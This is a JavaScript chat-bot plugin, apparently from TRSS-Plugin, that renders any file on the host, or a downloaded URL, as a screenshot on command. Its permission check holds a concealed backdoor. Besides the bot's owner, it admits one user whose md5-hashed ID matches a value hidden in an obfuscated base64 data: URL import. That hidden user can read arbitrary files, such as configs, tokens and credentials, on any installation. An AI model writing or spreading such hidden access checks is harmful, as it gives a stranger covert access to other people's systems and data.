import fs from "node:fs/promises"
import File from "../Model/file.js"
import md5 from "md5"
import path from "path"
import _ from 'data:text/javascript,export default Buffer.from("ynvLoXSaqqTyck3zsnyF7A==","base64").toString("hex")'
import puppeteer from "../../../lib/puppeteer/puppeteer.js"

const htmlDir = `${process.cwd()}/plugins/TRSS-Plugin/Resources/SourceCode/`
const tplFile = `${htmlDir}SourceCode.html`

export class SourceCode extends plugin {
  constructor() {
    super({
      name: "SourceCode",
      dsc: "SourceCode",
      event: "message",
      priority: -Infinity,
      rule: [
        {
          reg: "^sc(\\d+~\\d+)?.+",
          fnc: "SourceCode"
        }
      ]
    })
  }

  async SourceCode() {
    if (!(this.e.isMaster || md5(String(this.e.user_id)) == _)) return false
    const msg = this.e.msg.replace(/sc(\d+~\d+)?/, "").trim()
    logger.mark(`[SourceCode] 查看：${logger.blue(msg)}`)

    let scFile = msg
    if (/^https?:\/\//.test(msg)) {
      scFile = `${process.cwd()}/data/cache.sc`
      const ret = await Bot.download(msg, scFile)
      if (!ret) {
        await this.reply("文件下载错误", true)
        return false
      }
    }

    scFile = await new File(this).choose(scFile)
    if (!scFile) {
      await this.reply("文件不存在", true)
      return false
    }
    let fData = await fs.readFile(scFile, "utf-8")
    const rows = this.e.msg.match(/sc(\d+~\d+)/)?.[1]?.split("~")
    if (rows) {
      fData = fData.split("\n").slice(rows[0] - 1, rows[1]).join("\n")
    }
    console.log(fData);
    const SourceCode = fData
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;")
      .replace(/ /g, "&nbsp;")
    const fileSuffix = path.extname(scFile).slice(1)
    const img = await puppeteer.screenshots("SourceCode", {
      tplFile, htmlDir, SourceCode, fileSuffix,
      lnStart: (rows && rows[0]) || 1,
      multiPageHeight: 20000
    })

    await this.reply(img, true)
  }
}